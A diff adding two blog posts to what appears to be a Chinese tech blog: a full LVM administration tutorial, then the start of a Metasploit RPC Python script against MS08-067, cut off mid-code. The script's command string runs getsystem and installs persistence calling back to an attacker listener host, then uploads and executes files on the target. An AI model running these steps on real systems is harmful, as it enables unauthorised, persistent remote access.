@@ -398,6 +398,601 @@ var _hmt = _hmt || [];
 
 
   
+    <article id="post-LVM相关介绍" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/server/LVM相关介绍/">LVM相关介绍</a>
+    </h1>
+  
+
+        
+        <a href="/server/LVM相关介绍/" class="archive-article-date">
+  	<time datetime="2016-09-20T14:54:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-09-20</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="LVM概念"><a href="#LVM概念" class="headerlink" title="LVM概念"></a>LVM概念</h1><blockquote>
+<p>Logical Volume Manager 逻辑卷管理</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">通过将底层物理硬盘抽象封装起来，以逻辑卷的形式表现给上层系统，逻辑卷的大小可以动态调整，而且不会丢失现有数据。新加入的硬盘也不会改变现有上层的逻辑卷。</div><div class="line">作为一种多台磁盘管理机制，逻辑卷技术大大提高了磁盘管理的灵活性。</div></pre></td></tr></table></figure>
+<h2 id="LVM的4个基本概念"><a href="#LVM的4个基本概念" class="headerlink" title="LVM的4个基本概念"></a>LVM的4个基本概念</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">① PE　　(Physical Extend)　　物理拓展</div><div class="line"></div><div class="line">② PV　　(Physical Volume)　　物理卷</div><div class="line"></div><div class="line">③ VG　　(Volume Group)　　卷组</div><div class="line"></div><div class="line">④ LV　　(Logical Volume)　　逻辑卷</div></pre></td></tr></table></figure>
+<blockquote>
+<p>PE逻辑卷空间管理的最基本单位。1个PE默认是4M大小<br>VG的作用是用来装PV的–空间池</p>
+</blockquote>
+<p><img src="https://ww3.sinaimg.cn/large/006tNc79gy1fdtd144awyj30dz09maa8.jpg" alt=""></p>
+<p><img src="https://ww1.sinaimg.cn/large/006tNc79gy1fdtd1e7fvuj30es0akjrr.jpg" alt=""></p>
+<h1 id="创建LVM"><a href="#创建LVM" class="headerlink" title="创建LVM"></a>创建LVM</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">➜  ~ fdisk -l</div><div class="line"></div><div class="line">Disk /dev/sda: 300 GiB, 322122547200 bytes, 629145600 sectors</div><div class="line">Units: sectors of 1 * 512 = 512 bytes</div><div class="line">Sector size (logical/physical): 512 bytes / 512 bytes</div><div class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</div><div class="line">Disklabel type: dos</div><div class="line">Disk identifier: 0xc1fc20ae</div><div class="line"></div><div class="line">Device     Boot     Start       End   Sectors  Size Id Type</div><div class="line">/dev/sda1  *         2048 612370431 612368384  292G 83 Linux</div><div class="line">/dev/sda2       612372478 629143551  16771074    8G  5 Extended</div><div class="line">/dev/sda5       612372480 629143551  16771072    8G 82 Linux swap / Solaris</div><div class="line"></div><div class="line">Disk /dev/sdb: 50 GiB, 53687091200 bytes, 104857600 sectors</div><div class="line">Units: sectors of 1 * 512 = 512 bytes</div><div class="line">Sector size (logical/physical): 512 bytes / 512 bytes</div><div class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</div></pre></td></tr></table></figure>
+<ol>
+<li>将物理磁盘设备初始化为物理卷<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜  ~ pvcreate /dev/sdb</div><div class="line">  Physical volume &quot;/dev/sdb&quot; successfully created</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<blockquote>
+<p>查看物理卷信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">➜  ~ pvs</div><div class="line">  PV         VG   Fmt  Attr PSize  PFree</div><div class="line">  /dev/sdb        lvm2 ---  50.00g 50.00g</div></pre></td></tr></table></figure></p>
+</blockquote>
+<ol>
+<li>创建卷组，并将PV加入卷组中<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt;名字为lvmtest， 可任意</div><div class="line">➜  ~ vgcreate lvmtest /dev/sdb</div><div class="line">  Volume group &quot;lvmtest&quot; successfully created</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">➜  ~ vgs</div><div class="line">  VG      #PV #LV #SN Attr   VSize  VFree</div><div class="line">  lvmtest   1   0   0 wz--n- 50.00g 50.00g</div><div class="line">&gt;查看卷组信息</div><div class="line">➜  ~ vgdisplay</div><div class="line">  --- Volume group ---</div><div class="line">  VG Name               lvmtest</div><div class="line">  System ID             </div><div class="line">  Format                lvm2</div><div class="line">  Metadata Areas        1</div><div class="line">  Metadata Sequence No  1</div><div class="line">  VG Access             read/write</div><div class="line">  VG Status             resizable</div><div class="line">  MAX LV                0</div><div class="line">  Cur LV                0</div><div class="line">  Open LV               0</div><div class="line">  Max PV                0</div><div class="line">  Cur PV                1</div><div class="line">  Act PV                1</div><div class="line">  VG Size               50.00 GiB</div><div class="line">  PE Size               4.00 MiB</div><div class="line">  Total PE              12799</div><div class="line">  Alloc PE / Size       0 / 0   </div><div class="line">  Free  PE / Size       12799 / 50.00 GiB</div><div class="line">  VG UUID               cxMG1m-pMAE-Suk5-bM69-1sB3-W7YB-WXmmGh</div></pre></td></tr></table></figure>
+<ol>
+<li>基于卷组创建逻辑卷<blockquote>
+<p>这里我从lvmtest拿了20G空间来创建了一个名为lv1的逻辑卷</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜  ~ lvcreate -n lv1 -L 20G lvmtest</div><div class="line">  Logical volume &quot;lv1&quot; created</div></pre></td></tr></table></figure>
+</blockquote>
+</li>
+</ol>
+<blockquote>
+<p>查看逻辑卷信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">➜  ~ lvs</div><div class="line">  LV   VG      Attr       LSize  Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert</div><div class="line">  lv1  lvmtest -wi-a----- 20.00g                                                    </div><div class="line">➜  ~ lvdisplay</div><div class="line">  --- Logical volume ---</div><div class="line">  LV Path                /dev/lvmtest/lv1</div><div class="line">  LV Name                lv1</div><div class="line">  VG Name                lvmtest</div><div class="line">  LV UUID                Q4UIbv-yWhL-Bl5A-ywTN-1HJo-TE5r-TKBPfQ</div><div class="line">  LV Write Access        read/write</div><div class="line">  LV Creation host, time kali, 2016-08-03 08:44:31 +0800</div><div class="line">  LV Status              available</div><div class="line">  # open                 0</div><div class="line">  LV Size                20.00 GiB</div><div class="line">  Current LE             5120</div><div class="line">  Segments               1</div><div class="line">  Allocation             inherit</div><div class="line">  Read ahead sectors     auto</div><div class="line">  - currently set to     256</div><div class="line">  Block device           254:0</div></pre></td></tr></table></figure></p>
+</blockquote>
+<ol>
+<li><p>为创建好的逻辑卷创建文件系统</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">➜  ~ mkfs.ext4 /dev/lvmtest/lv1</div><div class="line">mke2fs 1.42.12 (29-Aug-2014)</div><div class="line">Creating filesystem with 5242880 4k blocks and 1310720 inodes</div><div class="line">Filesystem UUID: 5130e6e1-8293-4fcb-b580-5091f3840f99</div><div class="line">Superblock backups stored on blocks:</div><div class="line">	32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632, 2654208,</div><div class="line">	4096000</div><div class="line"></div><div class="line">Allocating group tables: done                            </div><div class="line">Writing inode tables: done                            </div><div class="line">Creating journal (32768 blocks): done</div><div class="line">Writing superblocks and filesystem accounting information: done</div></pre></td></tr></table></figure>
+</li>
+<li><p>将格式化好的逻辑卷挂载使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">➜  ~ mount /dev/lvmtest/lv1 /mnt/</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<blockquote>
+<p>查看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜  /mnt mount | tail -n 1</div><div class="line">/dev/mapper/lvmtest-lv1 on /mnt type ext4 (rw,relatime,data=ordered)</div></pre></td></tr></table></figure></p>
+</blockquote>
+<h1 id="删除LVM"><a href="#删除LVM" class="headerlink" title="删除LVM"></a>删除LVM</h1><blockquote>
+<p>先把相应的东西umount掉<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">➜  ~ umount /mnt</div></pre></td></tr></table></figure></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜  ~ mount | tail -n 1</div><div class="line">/dev/sr0 on /media/cdrom0 type iso9660 (ro,nosuid,nodev,noexec,relatime,user)</div></pre></td></tr></table></figure>
+<ol>
+<li><p>删除LV</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">➜  ~ lvremove /dev/lvmtest/lv1</div><div class="line">Do you really want to remove active logical volume lv1? [y/n]: y</div><div class="line">  Logical volume &quot;lv1&quot; successfully removed</div></pre></td></tr></table></figure>
+</li>
+<li><p>删除VG</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜  ~ vgremove lvmtest</div><div class="line">  Volume group &quot;lvmtest&quot; successfully removed</div></pre></td></tr></table></figure>
+</li>
+<li><p>删除物理卷</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜  ~ pvremove /dev/sdb</div><div class="line">  Labels on physical volume &quot;/dev/sdb&quot; successfully wiped</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<h1 id="扩充逻辑卷容量"><a href="#扩充逻辑卷容量" class="headerlink" title="扩充逻辑卷容量"></a>扩充逻辑卷容量</h1><blockquote>
+<p>逻辑卷的拉伸操作可以在线执行，不需要卸载逻辑卷</p>
+</blockquote>
+<ol>
+<li>保证VG中有足够的空闲空间</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">➜  ~ vgs</div><div class="line">  VG   #PV #LV #SN Attr   VSize  VFree</div><div class="line">  vg     1   1   0 wz--n- 50.00g 30.00g</div></pre></td></tr></table></figure>
+<ol>
+<li><p>扩充逻辑卷</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">➜  ~ lvextend  -L +1G /dev/vg/lv</div><div class="line">  Size of logical volume vg/lv changed from 20.00 GiB (5120 extents) to 21.00 GiB (5376 extents).</div><div class="line">  Logical volume lv successfully resized</div></pre></td></tr></table></figure>
+</li>
+<li><p>查看扩充后LV大小</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">➜  ~ lvdisplay</div><div class="line">  --- Logical volume ---</div><div class="line">  LV Path                /dev/vg/lv</div><div class="line">  LV Name                lv</div><div class="line">  VG Name                vg</div><div class="line">  LV UUID                5q9mCJ-7Y3f-dEo7-xlDz-lJAW-Oczm-RuCeIE</div><div class="line">  LV Write Access        read/write</div><div class="line">  LV Creation host, time kali, 2016-08-03 09:51:18 +0800</div><div class="line">  LV Status              available</div><div class="line">  # open                 0</div><div class="line">  LV Size                21.00 GiB</div><div class="line">  Current LE             5376</div><div class="line">  Segments               1</div><div class="line">  Allocation             inherit</div><div class="line">  Read ahead sectors     auto</div><div class="line">  - currently set to     256</div><div class="line">  Block device           254:0</div></pre></td></tr></table></figure>
+</li>
+<li><p>更新文件系统</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">➜  ~ resize2fs /dev/vg/lv</div><div class="line">resize2fs 1.42.12 (29-Aug-2014)</div><div class="line">Filesystem at /dev/vg/lv is mounted on /mnt; on-line resizing required</div><div class="line">old_desc_blocks = 2, new_desc_blocks = 2</div><div class="line">The filesystem on /dev/vg/lv is now 5505024 (4k) blocks long.</div></pre></td></tr></table></figure>
+</li>
+<li><p>查看更新后文件系统</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">➜  ~ df -h</div><div class="line">Filesystem         Size  Used Avail Use% Mounted on</div><div class="line">udev                10M     0   10M   0% /dev</div><div class="line">tmpfs              792M  9.1M  783M   2% /run</div><div class="line">/dev/sda1          288G   16G  257G   6% /</div><div class="line">tmpfs              2.0G  208K  2.0G   1% /dev/shm</div><div class="line">tmpfs              5.0M     0  5.0M   0% /run/lock</div><div class="line">tmpfs              2.0G     0  2.0G   0% /sys/fs/cgroup</div><div class="line">tmpfs              396M  8.0K  396M   1% /run/user/132</div><div class="line">tmpfs              396M   12K  396M   1% /run/user/0</div><div class="line">/dev/sr0           3.1G  3.1G     0 100% /media/cdrom0</div><div class="line">/dev/mapper/vg-lv   21G   44M   20G   1% /mnt</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<h1 id="扩充卷组容量"><a href="#扩充卷组容量" class="headerlink" title="扩充卷组容量"></a>扩充卷组容量</h1><ol>
+<li><p>将要添加到VG的硬盘格式化为PV</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜  ~ pvcreate /dev/sdc</div><div class="line">  Physical volume &quot;/dev/sdc&quot; successfully created</div></pre></td></tr></table></figure>
+</li>
+<li><p>将新的PV添加到指定卷组中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜  ~ vgextend vg /dev/sdc</div><div class="line">  Volume group &quot;vg&quot; successfully extended</div></pre></td></tr></table></figure>
+</li>
+<li><p>查看扩充后VG大小</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">➜  ~ vgs</div><div class="line">  VG   #PV #LV #SN Attr   VSize  VFree</div><div class="line">  vg     2   1   0 wz--n- 69.99g 48.99g</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<h1 id="缩小逻辑卷容量"><a href="#缩小逻辑卷容量" class="headerlink" title="缩小逻辑卷容量"></a>缩小逻辑卷容量</h1><blockquote>
+<p>逻辑卷的缩小操作必须离线执行，要卸载逻辑卷</p>
+</blockquote>
+<ol>
+<li><p>卸载一键挂载的逻辑卷</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">➜  ~ umount /dev/mapper/vg-lv</div></pre></td></tr></table></figure>
+</li>
+<li><p>缩小文件系统</p>
+<blockquote>
+<p>缩小为10G</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">➜  ~ resize2fs /dev/vg/lv 10G</div><div class="line">resize2fs 1.42.12 (29-Aug-2014)</div><div class="line">Please run &apos;e2fsck -f /dev/vg/lv&apos; first.</div><div class="line"></div><div class="line">➜  ~ resize2fs /dev/mapper/vg-lv 10G</div><div class="line">resize2fs 1.42.12 (29-Aug-2014)</div><div class="line">Please run &apos;e2fsck -f /dev/mapper/vg-lv&apos; first.</div><div class="line"></div><div class="line">➜  ~ e2fsck -f /dev/mapper/vg-lv</div><div class="line">e2fsck 1.42.12 (29-Aug-2014)</div><div class="line">Pass 1: Checking inodes, blocks, and sizes</div><div class="line">Pass 2: Checking directory structure</div><div class="line">Pass 3: Checking directory connectivity</div><div class="line">Pass 4: Checking reference counts</div><div class="line">Pass 5: Checking group summary information</div><div class="line">/dev/mapper/vg-lv: 11/1376256 files (0.0% non-contiguous), 130401/5505024 blocks</div><div class="line">➜  ~ resize2fs /dev/mapper/vg-lv 10G</div><div class="line">resize2fs 1.42.12 (29-Aug-2014)</div><div class="line">Resizing the filesystem on /dev/mapper/vg-lv to 2621440 (4k) blocks.</div><div class="line">The filesystem on /dev/mapper/vg-lv is now 2621440 (4k) blocks long.</div></pre></td></tr></table></figure>
+</blockquote>
+</li>
+<li><p>缩小LV</p>
+<blockquote>
+<p>缩小的容量为之前的容量减去文件系统容量<br>21-10=11</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">➜  ~ lvreduce -L -11G /dev/vg/lv</div><div class="line">  WARNING: Reducing active logical volume to 10.00 GiB</div><div class="line">  THIS MAY DESTROY YOUR DATA (filesystem etc.)</div><div class="line">Do you really want to reduce lv? [y/n]: y</div><div class="line">  Size of logical volume vg/lv changed from 21.00 GiB (5376 extents) to 10.00 GiB (2560 extents).</div><div class="line">  Logical volume lv successfully resized</div></pre></td></tr></table></figure>
+</blockquote>
+</li>
+<li><p>查看缩小后的LV</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">➜  ~ lvdisplay</div><div class="line">  --- Logical volume ---</div><div class="line">  LV Path                /dev/vg/lv</div><div class="line">  LV Name                lv</div><div class="line">  VG Name                vg</div><div class="line">  LV UUID                5q9mCJ-7Y3f-dEo7-xlDz-lJAW-Oczm-RuCeIE</div><div class="line">  LV Write Access        read/write</div><div class="line">  LV Creation host, time kali, 2016-08-03 09:51:18 +0800</div><div class="line">  LV Status              available</div><div class="line">  # open                 0</div><div class="line">  LV Size                10.00 GiB</div><div class="line">  Current LE             2560</div><div class="line">  Segments               1</div><div class="line">  Allocation             inherit</div><div class="line">  Read ahead sectors     auto</div><div class="line">  - currently set to     256</div><div class="line">  Block device           254:0</div></pre></td></tr></table></figure>
+</li>
+<li><p>挂载</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">➜  ~ mount /dev/vg/lv /mnt</div><div class="line">➜  ~ mount | tail -n 1</div><div class="line">/dev/mapper/vg-lv on /mnt type ext4 (rw,relatime,data=ordered)</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<h1 id="缩小卷组"><a href="#缩小卷组" class="headerlink" title="缩小卷组"></a>缩小卷组</h1><ol>
+<li><p>将一个PV从制定卷组中移除</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜  ~ vgreduce vg /dev/sdc</div><div class="line">  Removed &quot;/dev/sdc&quot; from volume group &quot;vg&quot;</div></pre></td></tr></table></figure>
+</li>
+<li><p>查看缩小后的卷组大小</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">~ vgdisplay</div><div class="line">--- Volume group ---</div><div class="line">VG Name               vg</div><div class="line">System ID             </div><div class="line">Format                lvm2</div><div class="line">Metadata Areas        1</div><div class="line">Metadata Sequence No  8</div><div class="line">VG Access             read/write</div><div class="line">VG Status             resizable</div><div class="line">MAX LV                0</div><div class="line">Cur LV                1</div><div class="line">Open LV               1</div><div class="line">Max PV                0</div><div class="line">Cur PV                1</div><div class="line">Act PV                1</div><div class="line">VG Size               50.00 GiB</div><div class="line">PE Size               4.00 MiB</div><div class="line">Total PE              12799</div><div class="line">Alloc PE / Size       2560 / 10.00 GiB</div><div class="line">Free  PE / Size       10239 / 40.00 GiB</div><div class="line">VG UUID               E32ZJW-3NqL-jpr2-1KYN-QWDh-dZhJ-1ZxZ2i</div></pre></td></tr></table></figure>
+</li>
+<li><p>移除物理卷</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">➜  ~ pvs</div><div class="line">  PV         VG   Fmt  Attr PSize  PFree</div><div class="line">  /dev/sdb   vg   lvm2 a--  50.00g 40.00g</div><div class="line">  /dev/sdc        lvm2 ---  20.00g 20.00g</div><div class="line">➜  ~ pvremove /dev/sdc</div><div class="line">  Labels on physical volume &quot;/dev/sdc&quot; successfully wiped</div><div class="line">➜  ~ pvs</div><div class="line">  PV         VG   Fmt  Attr PSize  PFree</div><div class="line">  /dev/sdb   vg   lvm2 a--  50.00g 40.00g</div><div class="line">➜  ~</div></pre></td></tr></table></figure>
+</li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Linux</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">LVM</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/server/" class="article-tag-list-link color2">server</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/server/LVM相关介绍/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-Demo-MSF检测指定服务的漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/sec/Demo-MSF检测指定服务的漏洞/">[Demo] MSF检测指定服务的漏洞</a>
+    </h1>
+  
+
+        
+        <a href="/sec/Demo-MSF检测指定服务的漏洞/" class="archive-article-date">
+  	<time datetime="2016-08-11T15:00:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-08-11</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>#相关资源</p>
+<blockquote>
+<p> <a href="https://github.com/SpiderLabs/msfrpc/tree/master/python-msfrpc" target="_blank" rel="external">SpiderLabs/msfrpc</a></p>
+</blockquote>
+<h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="string">'''</span></div><div class="line">用MSF检测指定服务的漏洞</div><div class="line">本脚本以 MS08-067为例</div><div class="line">'''</div><div class="line"></div><div class="line">__author__ = <span class="string">"SanNa"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> msfrpc</div><div class="line"><span class="keyword">import</span> optparse</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</div><div class="line"></div><div class="line"></div><div class="line">LOGIN = <span class="string">'msf'</span></div><div class="line">PASSWD = <span class="string">'abc123'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">builder</span><span class="params">(RHOST, LHOST, LPORT)</span>:</span></div><div class="line">    <span class="string">'''根据相关信息创建文件</span></div><div class="line"></div><div class="line">    :param RHOST: 目标ip</div><div class="line">    :param LHOST: 监听IP</div><div class="line">    :param LPORT: 监听端口</div><div class="line"></div><div class="line">    '''</div><div class="line">    postcomms = <span class="string">"""getsystem</span></div><div class="line">            run persistence -S -U -X -i 10 -p 80 -r """+LHOST+<span class="string">"""</span></div><div class="line">            cd c:\\</div><div class="line">            upload /tmp/ms08067_patch.exe c:\\</div><div class="line">            upload /tmp/ms08067_install.bat c:\\</div><div class="line">            execute -f ms08067_install.bat</div><div class="line">            